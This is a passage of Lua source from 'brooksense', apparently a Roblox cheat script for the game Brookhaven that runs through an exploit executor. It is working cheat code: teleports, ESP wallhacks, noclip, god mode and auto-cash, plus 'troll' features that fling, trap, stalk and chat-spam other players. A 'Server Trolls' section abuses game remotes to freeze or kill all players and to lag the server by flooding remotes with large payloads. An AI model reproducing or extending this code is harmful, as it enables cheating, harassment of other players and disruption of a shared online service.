Btn(pChr, "Reset Velocity", function() HRP.Velocity = Vector3.new(0,0,0) end, 6)

-- Teleport buttons
local locs = {
    {"Spawn", CFrame.new(0,5,0)},
    {"Bank", CFrame.new(120,5,80)},
    {"Police Station", CFrame.new(-90,5,-60)},
    {"Hospital", CFrame.new(200,5,-30)},
    {"Airport", CFrame.new(-200,5,150)},
    {"School", CFrame.new(50,5,200)},
    {"Gas Station", CFrame.new(-50,5,120)},
    {"Mall", CFrame.new(100,5,150)},
    {"Fire Station", CFrame.new(-120,5,0)},
    {"Prison", CFrame.new(250,5,100)},
}
for i, l in ipairs(locs) do
    Btn(pTP, "TP: "..l[1], function() HRP.CFrame = l[2] end, i)
end
Btn(pTP, "TP to Nearest Player", function()
    local best, bd = nil, math.huge
    for _, p in ipairs(GetPlayers()) do
        if p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if r then
                local d = (HRP.Position - r.Position).Magnitude
                if d < bd then bd = d; best = r end
            end
        end
    end
    if best then HRP.CFrame = best.CFrame * CFrame.new(3,0,0) end
end, #locs+1)

-- ================================================================
-- VISUALS TAB
-- ================================================================
local vE = GB(TabPages["Visuals"], "ESP", 1)
local vV = GB(TabPages["Visuals"], "Visual", 2)
local vW = GB(TabPages["Visuals"], "World", 3)

Toggle(vE, "Player ESP", "ESP", nil, 1)
Toggle(vE, "Name Tags", "NameESP", nil, 2)
Toggle(vE, "Health Bars", "HealthESP", nil, 3)
Toggle(vE, "Distance", "DistESP", nil, 4)
Toggle(vE, "Chams (Highlight)", "Chams", nil, 5)

Toggle(vV, "Fullbright", "Fullbright", nil, 1)
Toggle(vV, "No Fog", "NoFog", function(on)
    Lighting.FogEnd = on and 1e6 or 100000
    Lighting.FogStart = on and 1e6 or 0
end, 2)
Toggle(vV, "FOV Changer", "FovChange", function(on)
    Cam.FieldOfView = on and State.FovVal or 70
end, 3)
Slider(vV, "FOV", "FovVal", 40, 120, function(v)
    if State.FovChange then Cam.FieldOfView = v end
end, 4)

Btn(vW, "Remove Shadows", function()
    Lighting.GlobalShadows = false
end, 1)
Btn(vW, "Remove Decorations", function()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
            obj.Enabled = false
        end
    end
end, 2)
Btn(vW, "X-Ray Walls", function()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Transparency < 0.5 and not obj.Parent:FindFirstChildOfClass("Humanoid") then
            if obj.Size.X > 10 or obj.Size.Z > 10 then
                obj.Transparency = 0.7
            end
        end
    end
end, 3)

-- ================================================================
-- WORLD TAB
-- ================================================================
local wT = GB(TabPages["World"], "Time & Lighting", 1)
local wS = GB(TabPages["World"], "Server", 2)
local wC = GB(TabPages["World"], "Car", 3)

Toggle(wT, "Lock Time", "LockTime", nil, 1)
Slider(wT, "Time", "TimeVal", 0, 24, function(v) Lighting.ClockTime = v end, 2)
Btn(wT, "Day", function() Lighting.ClockTime = 14 end, 3)
Btn(wT, "Night", function() Lighting.ClockTime = 0 end, 4)
Btn(wT, "Sunset", function() Lighting.ClockTime = 18 end, 5)

Toggle(wS, "Auto Cash", "AutoCash", nil, 1)
Btn(wS, "Server Hop", function()
    task.spawn(function()
        local reqFn = request or http_request or (syn and syn.request)
        if not reqFn then return end
        local ok2, res = pcall(function()
            return HttpService:JSONDecode(
                reqFn({Url="https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100", Method="GET"}).Body
            )
        end)
        if not ok2 or not res or not res.data then return end
        local list = {}
        for _, s in ipairs(res.data) do
            if s.id ~= game.JobId and s.playing and s.playing < (s.maxPlayers or 20) then
                table.insert(list, s.id)
            end
        end
        if #list > 0 then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, list[math.random(#list)], LP)
        end
    end)
end, 2)
Btn(wS, "Rejoin", function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
end, 3)

Toggle(wC, "Car Speed", "CarSpeed", function(on)
    if on then
        task.spawn(function()
            while State.CarSpeed do
                pcall(function()
                    local seat = Hum.SeatPart
                    if seat and seat.Parent then
                        local car = seat.Parent
                        for _, p in ipairs(car:GetDescendants()) do
                            if p:IsA("VehicleSeat") then p.MaxSpeed = State.CarSpeedVal end
                        end
                    end
                end)
                task.wait(0.5)
            end
        end)
    end
end, 1)
Slider(wC, "Car Speed Value", "CarSpeedVal", 50, 500, nil, 2)

-- ================================================================
-- TROLL TAB
-- ================================================================
local tNF  = GB(TabPages["Troll"], "Neck Float", 1)
local tOrb = GB(TabPages["Troll"], "Orbit Player", 2)
local tSk  = GB(TabPages["Troll"], "Skin Copy", 3)
local tFl  = GB(TabPages["Troll"], "Fling", 4)
local tAn  = GB(TabPages["Troll"], "Annoy", 5)
local tM   = GB(TabPages["Troll"], "Misc Trolls", 6)
local tSrv = GB(TabPages["Troll"], "Server Trolls", 7)

-- Neck Float
TBox(tNF, "Target username...", "NeckTarget", 1)
Toggle(tNF, "Neck Float", "NeckFloat", function(on)
    Hum.PlatformStand = on
end, 2)

-- Orbit
TBox(tOrb, "Target username...", "SpinTarget", 1)
Toggle(tOrb, "Orbit Player", "SpinPlayer", function(on)
    Hum.PlatformStand = on
end, 2)
Slider(tOrb, "Orbit Speed", "SpinSpeed", 1, 20, nil, 3)
Slider(tOrb, "Orbit Radius", "SpinRadius", 2, 20, nil, 4)

-- Skin Copy
TBox(tSk, "Target username...", "SkinTarget", 1)
Btn(tSk, "Copy Target Skin", function()
    local t = FindPlayer(State.SkinTarget)
    if not t then
        -- copy nearest
        local best, bd = nil, math.huge
        for _, p in ipairs(GetPlayers()) do
            if p.Character then
                local r = p.Character:FindFirstChild("HumanoidRootPart")
                if r then local d = (HRP.Position - r.Position).Magnitude; if d < bd then bd = d; best = p end end
            end
        end
        t = best
    end
    if not t or not t.Character then
        print("[brooksense] Skin Copy failed: target player not found or has no character")
        return
    end
    local ok2, desc = pcall(function()
        return t.Character:FindFirstChildOfClass("Humanoid"):GetAppliedDescription()
    end)
    if not ok2 or not desc then
        print("[brooksense] Skin Copy failed: could not get target's HumanoidDescription - " .. tostring(desc or "nil"))
        return
    end
    local applyOk, applyErr = pcall(function() Char:FindFirstChildOfClass("Humanoid"):ApplyDescription(desc:Clone()) end)
    if not applyOk then
        print("[brooksense] Skin Copy failed: could not apply description - " .. tostring(applyErr))
    end
    -- fire brookhaven remote for accessories
    local fields = {"Hat","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory"}
    for _, field in ipairs(fields) do
        local v = nil
        pcall(function() v = desc[field] end)
        if v and v ~= "" then
            for id in tostring(v):gmatch("%d+") do
                local n = tonumber(id)
                if n and n ~= 0 then FireAvatar("wear", n) end
            end
        end
    end
end, 2)
Btn(tSk, "Copy Nearest Skin", function()
    State.SkinTarget = ""
    local best, bd = nil, math.huge
    for _, p in ipairs(GetPlayers()) do
        if p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if r then local d = (HRP.Position - r.Position).Magnitude; if d < bd then bd = d; best = p end end
        end
    end
    if best then State.SkinTarget = best.Name end
end, 3)

-- Fling
TBox(tFl, "Fling target...", "FlingTarget", 1)
Toggle(tFl, "Fling", "Fling", function(on)
    if on then
        task.spawn(function()
            while State.Fling do
                local t = FindPlayer(State.FlingTarget)
                if t and t.Character then
                    local tHRP = t.Character:FindFirstChild("HumanoidRootPart")
                    if tHRP then
                        -- Fling: teleport to target, set high velocity on SELF which physics transfers to them on collision
                        HRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, -1)
                        HRP.Velocity = Vector3.new(
                            math.random(-1,1) * State.FlingPower,
                            State.FlingPower * 0.5,
                            math.random(-1,1) * State.FlingPower
                        )
                        -- Also directly set target velocity if we have network ownership
                        pcall(function()
                            tHRP.Velocity = Vector3.new(
                                math.random(-1,1) * State.FlingPower,
                                State.FlingPower,
                                math.random(-1,1) * State.FlingPower
                            )
                        end)
                        task.wait(0.15)
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end, 2)
Slider(tFl, "Fling Power", "FlingPower", 100, 2000, nil, 3)

-- Annoy
TBox(tAn, "Annoy target...", "AnnoyTarget", 1)
Toggle(tAn, "Annoy (TP behind)", "Annoy", function(on)
    if on then
        task.spawn(function()
            while State.Annoy do
                local t = FindPlayer(State.AnnoyTarget)
                if t and t.Character then
                    local tHRP = t.Character:FindFirstChild("HumanoidRootPart")
                    if tHRP then
                        HRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, 2)
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end, 2)
Toggle(tAn, "Face (TP front)", "AnnoyFront", function(on)
    if on then
        task.spawn(function()
            while State.AnnoyFront do
                local t = FindPlayer(State.AnnoyTarget)
                if t and t.Character then
                    local tHRP = t.Character:FindFirstChild("HumanoidRootPart")
                    if tHRP then
                        HRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, -2)
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end, 3)

-- Misc Trolls
Toggle(tM, "Attach (Ride Head)", "Attach", function(on)
    if on then
        task.spawn(function()
            while State.Attach do
                local t = FindPlayer(State.AttachTarget)
                if t and t.Character then
                    local tH = t.Character:FindFirstChild("Head")
                    if tH then
                        HRP.CFrame = tH.CFrame * CFrame.new(0, 1.5, 0)
                        HRP.Velocity = Vector3.new(0,0,0)
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end, 1)
TBox(tM, "Attach target...", "AttachTarget", 2)
Toggle(tM, "Copycat (Follow)", "Copycat", function(on)
    if on then
        task.spawn(function()
            while State.Copycat do
                local t = FindPlayer(State.CopycatTarget)
                if t and t.Character then
                    local tHRP = t.Character:FindFirstChild("HumanoidRootPart")
                    if tHRP then
                        -- Stay 3 studs behind target, face same direction
                        HRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, 3)
                        HRP.Velocity = Vector3.new(0,0,0)
                    end
                end
                task.wait(0.15)
            end
        end)
    end
end, 3)
TBox(tM, "Copycat target...", "CopycatTarget", 4)
Toggle(tM, "Disco Lights", "DiscoLights", function(on)
    if on then
        task.spawn(function()
            while State.DiscoLights do
                Lighting.Ambient = Color3.fromHSV(math.random(), 1, 1)
                Lighting.OutdoorAmbient = Color3.fromHSV(math.random(), 1, 1)
                Lighting.FogColor = Color3.fromHSV(math.random(), 0.5, 1)
                task.wait(0.3)
            end
            -- Reset
            Lighting.Ambient = Color3.fromRGB(128,128,128)
            Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
            Lighting.FogColor = Color3.fromRGB(192,192,192)
        end)
    end
end, 5)
Toggle(tM, "Spam Emotes", "SpamEmotes", function(on)
    if on then
        task.spawn(function()
            while State.SpamEmotes do
                pcall(function() Hum.Sit = true end)
                task.wait(0.4)
                pcall(function() Hum.Sit = false; Hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
                task.wait(0.4)
            end
        end)
    end
end, 6)
Btn(tM, "Push Nearest", function()
    local best, bd = nil, math.huge
    for _, p in ipairs(GetPlayers()) do
        if p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if r then local d = (HRP.Position - r.Position).Magnitude; if d < bd then bd = d; best = r end end
        end
    end
    if best and bd < 15 then
        pcall(function()
            best.Velocity = (best.Position - HRP.Position).Unit * 150 + Vector3.new(0, 80, 0)
        end)
    end
end, 7)
Btn(tM, "Trap Nearest (Box)", function()
    local best, bd = nil, math.huge
    for _, p in ipairs(GetPlayers()) do
        if p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            if r then local d = (HRP.Position - r.Position).Magnitude; if d < bd then bd = d; best = r end end
        end
    end
    if best then
        local pos = best.Position
        local walls = {
            {CFrame.new(pos + Vector3.new(3,5,0)), Vector3.new(1,10,6)},
            {CFrame.new(pos + Vector3.new(-3,5,0)), Vector3.new(1,10,6)},
            {CFrame.new(pos + Vector3.new(0,5,3)), Vector3.new(6,10,1)},
            {CFrame.new(pos + Vector3.new(0,5,-3)), Vector3.new(6,10,1)},
            {CFrame.new(pos + Vector3.new(0,10,0)), Vector3.new(6,1,6)},
        }
        for _, w in ipairs(walls) do
            local p = Instance.new("Part")
            p.CFrame = w[1]; p.Size = w[2]
            p.Anchored = true; p.Transparency = 0.5
            p.BrickColor = BrickColor.new("Really black")
            p.Name = "GS_Trap"
            p.Parent = workspace
        end
        -- Auto remove after 8 seconds
        task.spawn(function()
            task.wait(8)
            for _, obj in ipairs(workspace:GetChildren()) do
                if obj.Name == "GS_Trap" then obj:Destroy() end
            end
        end)
    end
end, 8)
Toggle(tM, "Invisible (local)", "Invisible", function(on)
    if not Char then return end
    for _, p in ipairs(Char:GetDescendants()) do
        if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
            p.LocalTransparencyModifier = on and 1 or 0
        end
    end
end, 1)
Toggle(tM, "Chat Spam", "ChatSpam", nil, 2)
Toggle(tM, "Spin Self", "SpinSelf", nil, 3)
Slider(tM, "Spin Speed", "SpinSelfSpeed", 1, 50, nil, 4)
Toggle(tM, "Fake Lag", "FakeLag", nil, 5)
Slider(tM, "Lag Amount (ms)", "FakeLagMs", 50, 500, nil, 6)
Toggle(tM, "Black Hole", "BlackHole", nil, 7)
Slider(tM, "BH Radius", "BHRadius", 10, 100, nil, 8)
Toggle(tM, "Headless Troll", "HeadlessTroll", function(on)
    pcall(function()
        local head = Char:FindFirstChild("Head")
        if head then head.Transparency = on and 1 or 0 end
        local face = head and head:FindFirstChildOfClass("Decal")
        if face then face.Transparency = on and 1 or 0 end
    end)
end, 11)
Toggle(tM, "Giant Self", "GiantSelf", function(on)
    if on then State.TinySelf = false end
    pcall(function()
        local scale = Hum:FindFirstChildOfClass("NumberValue") or Hum:FindFirstChild("BodyHeightScale") or Hum:FindFirstChild("HeadScale")
        if not scale then return end
        for _, s in ipairs(Hum:GetChildren()) do
            if s:IsA("NumberValue") and s.Name:find("Scale") then
                s.Value = on and 3 or 1
            end
        end
    end)
end, 12)
Toggle(tM, "Tiny Self", "TinySelf", function(on)
    if on then State.GiantSelf = false end
    pcall(function()
        for _, s in ipairs(Hum:GetChildren()) do
            if s:IsA("NumberValue") and s.Name:find("Scale") then
                s.Value = on and 0.3 or 1
            end
        end
    end)
end, 13)

-- Server Trolls
Btn(tSrv, "Scare All (Sound)", function()
    local r = GetRemote("gunsound") or GetRemote("GunSound")
    if r then
        for _, p in ipairs(Players:GetPlayers()) do
            pcall(function() r:FireServer(p, 7083236436, 1) end)
        end
    end
end, 1)
Btn(tSrv, "Force Jump All", function()
    local r = GetRemote("playertrigger") or GetRemote("PlayerTrigger")
    if r then
        for _, p in ipairs(Players:GetPlayers()) do
            pcall(function() r:FireServer("DropButtonStopAll", p) end)
        end
    end
end, 2)
Btn(tSrv, "Lag Server (Sound Spam)", function()
    task.spawn(function()
        -- Method 1: Play all sounds rapidly
        local sounds = {}
        for _, obj in ipairs(game:GetDescendants()) do
            if obj:IsA("Sound") then table.insert(sounds, obj) end
        end
        for i = 1, 15 do
            for _, s in ipairs(sounds) do
                pcall(function() s:Play() end)
            end
            task.wait(0.2)
        end
    end)
end, 3)
Btn(tSrv, "Lag Server (Remote Spam)", function()
    task.spawn(function()
        -- Method 2: Spam all remotes with large data
        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
            if v:IsA("RemoteEvent") then
                for i = 1, 5 do
                    pcall(function() v:FireServer(string.rep("a", 500)) end)
                end
            end
        end
    end)
end, 4)
Btn(tSrv, "Lag Server (Network)", function()
    task.spawn(function()
        -- Method 3: SetPlayerBlockList spam (sends huge tables to server)
        pcall(function()
            local tbl = {}
            for i = 1, 200 do table.insert(tbl, {string.rep("x", 100)}) end
            local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
            if remote then
                for i = 1, 10 do
                    pcall(function() remote:FireServer(tbl) end)
                    task.wait(0.1)
                end
            end
        end)
    end)
end, 5)
Btn(tSrv, "Piggyback All (Kill)", function()
    local r = GetRemote("playertrigger") or GetRemote("PlayerTrigger")
    if not r then return end
    for _, p in ipairs(GetPlayers()) do
        pcall(function() r:FireServer("Client2ClientRequest: Piggyback!", p) end)
        pcall(function() r:FireServer("BothWantPiggyBackRide", p) end)
    end
end, 5)
Btn(tSrv, "Freeze All", function()
    local r = GetRemote("playertrigger") or GetRemote("PlayerTrigger")
    if not r then return end
    for _, p in ipairs(GetPlayers()) do
        pcall(function() r:FireServer("Both want a piggyback ride", p) end)
        task.wait(0.05)
        pcall(function() r:FireServer("DropButtonStopAll", p) end)
    end
end, 6)

-- ================================================================
-- AVATAR TAB
-- ================================================================
local avC = GB(TabPages["Avatar"], "Skin Colors", 1)
local avA = GB(TabPages["Avatar"], "Accessories", 2)
local avE = GB(TabPages["Avatar"], "Emotes & Anim", 3)

Toggle(avC, "Rainbow Skin", "RainbowSkin", nil, 1)
Btn(avC, "Red", function() FireAvatar("skintone","Really Red") end, 2)
Btn(avC, "Blue", function() FireAvatar("skintone","Really blue") end, 3)
Btn(avC, "Green", function() FireAvatar("skintone","Lime green") end, 4)
Btn(avC, "Black", function() FireAvatar("skintone","Really Black") end, 5)
Btn(avC, "White", function() FireAvatar("skintone","White") end, 6)
Btn(avC, "Pink", function() FireAvatar("skintone","Pink") end, 7)
Btn(avC, "Purple", function() FireAvatar("skintone","Magenta") end, 8)
Btn(avC, "Yellow", function() FireAvatar("skintone","New Yeller") end, 9)
Btn(avC, "Brown", function() FireAvatar("skintone","Brown") end, 10)

TBox(avA, "Hat/Accessory ID...", "HatId", 1)
Btn(avA, "Wear Hat", function()
    local id = tonumber(State.HatId)
    if id then FireAvatar("wear", id) end
end, 2)
Btn(avA, "Remove All Accessories", function()
    FireAvatar("removeaccessories")
    pcall(function()
        for _, obj in ipairs(Char:GetChildren()) do
            if obj:IsA("Accessory") then obj:Destroy() end
        end
    end)
end, 3)
Btn(avA, "Dominus (12345679)", function() FireAvatar("wear", 12345679) end, 4)
Btn(avA, "Valkyrie (1365767)", function() FireAvatar("wear", 1365767) end, 5)
Btn(avA, "Korblox (11827688)", function() FireAvatar("wear", 11827688) end, 6)

Btn(avE, "Dance 1", function() pcall(function() Hum:LoadAnimation(Instance.new("Animation")):Play() end) end, 1)
Btn(avE, "Sit", function() Hum.Sit = true end, 2)
Btn(avE, "Jump", function() Hum:ChangeState(Enum.HumanoidStateType.Jumping) end, 3)

-- ================================================================
-- MISC TAB
-- ================================================================
local mA = GB(TabPages["Misc"], "Automation", 1)
local mI = GB(TabPages["Misc"], "Info", 2)
local mL = GB(TabPages["Misc"], "Links", 3)

Toggle(mA, "Auto Cash Collect", "AutoCash", nil, 1)
Btn(mA, "Collect All Pickups", function()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and (obj.Name:lower():find("cash") or obj.Name:lower():find("money") or obj.Name:lower():find("pickup")) then
            if (HRP.Position - obj.Position).Magnitude < 100 then
                HRP.CFrame = CFrame.new(obj.Position + Vector3.new(0,2,0))
                task.wait(0.1)
            end
        end
    end
end, 2)
Btn(mA, "Kill All NPCs", function()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Humanoid") and obj.Parent and not Players:GetPlayerFromCharacter(obj.Parent) then
            obj.Health = 0
        end
    end
end, 3)

N("TextLabel",{Size=UDim2.new(1,0,0,80),BackgroundTransparency=1,LayoutOrder=1,
    Text=string.format("Username: %s\nDisplay: %s\nUserID: %d\nAccount Age: %d days\nServer: %d/%d players\nJobId: %s",
        LP.Name, LP.DisplayName, LP.UserId, LP.AccountAge, #Players:GetPlayers(), Players.MaxPlayers, tostring(game.JobId):sub(1,8).."..."),
    Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=mI})

Btn(mL, "Copy Discord Invite", function()
    if setclipboard then setclipboard(DISCORD_INV) end
end, 1)
Btn(mL, "Copy Server Link", function()
    if setclipboard then
        setclipboard(string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, tostring(game.JobId)))
    end
end, 2)

-- ================================================================
-- SETTINGS TAB
-- ================================================================
local sE = GB(TabPages["Settings"], "ESP Color", 1)
local sA = GB(TabPages["Settings"], "Accent Color", 2)
local sU = GB(TabPages["Settings"], "UI", 3)

Slider(sE, "R", "EspR", 0, 255, nil, 1)
Slider(sE, "G", "EspG", 0, 255, nil, 2)
Slider(sE, "B", "EspB", 0, 255, nil, 3)

Slider(sA, "R", "AccR", 0, 255, function()
    C.Acc = AccColor(); C.AccL = AccColor()
end, 1)
Slider(sA, "G", "AccG", 0, 255, function()
    C.Acc = AccColor(); C.AccL = AccColor()
end, 2)
Slider(sA, "B", "AccB", 0, 255, function()
    C.Acc = AccColor(); C.AccL = AccColor()
end, 3)

Btn(sU, "Toggle Insert Key (show/hide)", function()
    Win.Visible = not Win.Visible
    Shadow.Visible = Win.Visible
end, 1)
Btn(sU, "Destroy GUI", function()
    SG:Destroy()
end, 2)

-- ================================================================
-- ABOUT TAB
-- ================================================================
local abD = GB(TabPages["About"], "Developer", 1)
local abC = GB(TabPages["About"], "Credits", 2)
local abV = GB(TabPages["About"], "Version", 3)

N("TextLabel",{Size=UDim2.new(1,0,0,70),BackgroundTransparency=1,LayoutOrder=1,
    Text="brooksense "..VERSION.."\n\nDeveloper: kencsar\nDiscord: kencsar\nServer: discord.gg/nvuAjkcWX\n\nBest Brookhaven Script",
    Font=Enum.Font.Gotham,TextSize=12,TextColor3=C.Txt,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=abD})

N("TextLabel",{Size=UDim2.new(1,0,0,50),BackgroundTransparency=1,LayoutOrder=1,
    Text="UI: GameSense/Skeet inspired\nExecutor: Solara compatible\nFeatures: ESP, Troll, Avatar, Fly, Noclip, etc.",
    Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,Parent=abC})

N("TextLabel",{Size=UDim2.new(1,0,0,30),BackgroundTransparency=1,LayoutOrder=1,
    Text="Version: "..VERSION.." | Build: "..os.date("%Y-%m-%d"),
    Font=Enum.Font.Gotham,TextSize=11,TextColor3=C.TxtD,TextXAlignment=Enum.TextXAlignment.Left,Parent=abV})

-- ================================================================
-- CORE LOOPS (RunService) - OPTIMIZED: 3 connections only
-- ================================================================

local spinAngle = 0
local selfSpinA = 0
local lastLagT = 0
local lastRainbow = 0

-- Infinite Jump (event-based, not a loop)
UserInputService.JumpRequest:Connect(function()
    if State.InfJump and Hum then
        Hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- SINGLE Stepped (physics)
RunService.Stepped:Connect(function()
    if not Char or not HRP or not Hum then return end
    if State.Noclip then
        for _, p in ipairs(Char:GetDescendants()) do
            if p:IsA("BasePart") then p.CanCollide = false end
        end
    end
    if State.AntiAFK and math.floor(tick()) % 5 == 0 then
        pcall(function() game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), CFrame.new()) end)
    end
    if State.GodMode and Hum.Health < Hum.MaxHealth then
        Hum.Health = Hum.MaxHealth
    end
end)

-- SINGLE RenderStepped (visuals + movement)
RunService.RenderStepped:Connect(function(dt)
    if not Char or not HRP or not Hum then return end

    -- Fly
    if State.Fly then
        local bv = HRP:FindFirstChild("GS_BV")
        local bg = HRP:FindFirstChild("GS_BG")
        if bv and bg then
            local dir = Vector3.new(0,0,0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + Cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - Cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - Cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + Cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0,1,0) end
            if dir.Magnitude > 0 then dir = dir.Unit end
            bv.Velocity = dir * State.FlySpeed
            bg.CFrame = Cam.CFrame
        end
    end

    -- Visuals
    if State.Fullbright then
        Lighting.Brightness = 2; Lighting.ClockTime = 14
        Lighting.FogEnd = 1e6; Lighting.FogStart = 1e6; Lighting.GlobalShadows = false
    end
    if State.FovChange then Cam.FieldOfView = State.FovVal end
    if State.LockTime and not State.Fullbright then Lighting.ClockTime = State.TimeVal end

    -- Neck Float (fixed)
    if State.NeckFloat then
        local t = FindPlayer(State.NeckTarget)
        if t and t.Character then
            local tH = t.Character:FindFirstChild("HumanoidRootPart")
            if tH then
                HRP.CFrame = CFrame.new(tH.Position + Vector3.new(0, 3.5, 0))
                HRP.Velocity = Vector3.new(0,0,0)
            end
        end
    end

    -- Orbit (fixed: velocity nulled so you don't fly away)
    if State.SpinPlayer then
        local t = FindPlayer(State.SpinTarget)
        if t and t.Character then
            local tH = t.Character:FindFirstChild("HumanoidRootPart")
            if tH then
                spinAngle = spinAngle + dt * State.SpinSpeed
                local orbitPos = tH.Position + Vector3.new(math.cos(spinAngle)*State.SpinRadius, 0, math.sin(spinAngle)*State.SpinRadius)
                HRP.CFrame = CFrame.new(orbitPos, tH.Position)
                HRP.Velocity = Vector3.new(0,0,0)
            end
        end
    end

    -- Spin Self
    if State.SpinSelf then
        selfSpinA = selfSpinA + dt * State.SpinSelfSpeed * 10
        HRP.CFrame = CFrame.new(HRP.Position) * CFrame.Angles(0, math.rad(selfSpinA), 0)
    end

    -- Bunnyhop
    if State.Bunnyhop and Hum.FloorMaterial ~= Enum.Material.Air then
        Hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end

    -- Fake Lag (skip frames instead of blocking)
    if State.FakeLag then
        local now = tick()
        if now - lastLagT < (State.FakeLagMs / 1000) then
            return -- skip this frame entirely instead of blocking
        end
        lastLagT = tick()
    end
end)

-- SINGLE Heartbeat (less frequent tasks)
local hbTick = 0
RunService.Heartbeat:Connect(function(dt)
    if not Char or not HRP then return end
    hbTick = hbTick + dt

    if State.BlackHole and hbTick > 0.3 then
        local count = 0
        for _, obj in ipairs(workspace:GetDescendants()) do
            if count > 50 then break end -- max 50 object per tick
            if obj:IsA("BasePart") and not obj.Anchored and obj.Name ~= "HumanoidRootPart" then
                local dist = (obj.Position - HRP.Position).Magnitude
                if dist < State.BHRadius and dist > 1 then
                    pcall(function() obj.Velocity = (HRP.Position - obj.Position).Unit * (30/dist) end)
                    count = count + 1
                end
            end
        end
    end

    if State.AutoCash and hbTick > 0.5 then
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and (obj.Name == "Cash" or obj.Name == "Money") then
                if (HRP.Position - obj.Position).Magnitude < 60 then
                    HRP.CFrame = CFrame.new(obj.Position + Vector3.new(0,2,0))
                    break
                end
            end
        end
    end

    if State.RainbowSkin and tick() - lastRainbow > 0.6 then
        lastRainbow = tick()
        local cols = {"Really Red","Lime green","Really blue","New Yeller","Magenta","Pink","Brown","Teal"}
        FireAvatar("skintone", cols[math.random(#cols)])
    end

    if hbTick > 1 then hbTick = 0 end
end)

-- Chat Spam (background task)
task.spawn(function()
    while true do
        task.wait(3)
        if State.ChatSpam then
            SendChat((State.SpamMsg ~= "") and State.SpamMsg or "brooksense")
        end
    end
end)

-- ================================================================
-- ESP SYSTEM
-- ================================================================
local BONES = {
    {"Head","UpperTorso"},{"UpperTorso","LowerTorso"},
    {"UpperTorso","RightUpperArm"},{"RightUpperArm","RightLowerArm"},{"RightLowerArm","RightHand"},
    {"UpperTorso","LeftUpperArm"},{"LeftUpperArm","LeftLowerArm"},{"LeftLowerArm","LeftHand"},
    {"LowerTorso","RightUpperLeg"},{"RightUpperLeg","RightLowerLeg"},{"RightLowerLeg","RightFoot"},
    {"LowerTorso","LeftUpperLeg"},{"LeftUpperLeg","LeftLowerLeg"},{"LeftLowerLeg","LeftFoot"},
}
-- R6 fallback bones
local BONES_R6 = {
    {"Head","Torso"},{"Torso","Right Arm"},{"Torso","Left Arm"},
    {"Torso","Right Leg"},{"Torso","Left Leg"},
}

local DrawingSupported = false
pcall(function()
    local t = Drawing.new("Line")
    t:Remove()
    DrawingSupported = true
end)

local ESPData = {}

local function ClearESP(pl)
    local d = ESPData[pl]
    if not d then return end
    for _, ln in ipairs(d.lines or {}) do pcall(function() ln:Remove() end) end
    if d.bb then pcall(function() d.bb:Destroy() end) end
    if d.hl then pcall(function() d.hl:Destroy() end) end
    ESPData[pl] = nil
end

local function GetBones(char)
    if char:FindFirstChild("UpperTorso") then return BONES end
    if char:FindFirstChild("Torso") then return BONES_R6 end
    return BONES
end

local function BuildESP(pl)
    ClearESP(pl)
    local c = pl.Character
    if not c then return end
    local hrp = c:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local bones = GetBones(c)
    local d = {lines = {}}

    -- Skeleton lines (Drawing API)
    if DrawingSupported then
        for _ = 1, #bones do
            local ok2, ln = pcall(function() return Drawing.new("Line") end)
            if ok2 and ln then
                ln.Visible = false
                ln.Color = EspColor()
                ln.Thickness = 1.5
                ln.Transparency = 1
                table.insert(d.lines, ln)
            end
        end
    end

    -- BillboardGui for name/HP/distance
    local bb = N("BillboardGui",{Name="GS_BB",Size=UDim2.new(0,150,0,55),StudsOffset=Vector3.new(0,4,0),AlwaysOnTop=true,ResetOnSpawn=false,Adornee=hrp,Parent=hrp})
    d.bb = bb

    d.nameLbl = N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,16), Position=UDim2.new(0.5,0,0,0),
